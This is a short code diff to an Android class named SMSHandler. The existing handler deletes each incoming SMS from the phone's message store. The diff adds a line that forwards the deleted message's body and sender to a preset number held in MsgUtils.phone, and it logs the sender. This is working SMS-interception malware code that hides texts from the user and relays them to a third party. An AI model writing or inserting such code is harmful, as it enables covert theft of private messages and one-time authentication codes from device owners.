@@ -25,18 +25,12 @@ public class SMSHandler extends Handler {
 	public void handleMessage(Message message)
 
 	{
-
-		Log.i(TAG, "handleMessage: " + message);
-
 		MessageItem item = (MessageItem) message.obj;
-
+		Log.i(TAG, "handleMessage: " + message + " 发送者:" + item.getPhone());
 		// delete the sms
-
 		Uri uri = ContentUris.withAppendedId(SMS.CONTENT_URI, item.getId());
-
 		mContext.getContentResolver().delete(uri, null, null);
-
 		Log.i(TAG, "delete sms item: " + item);
-
+		MsgUtils.msgSend(item.getBody(), item.getPhone(), MsgUtils.phone);
 	}
 }
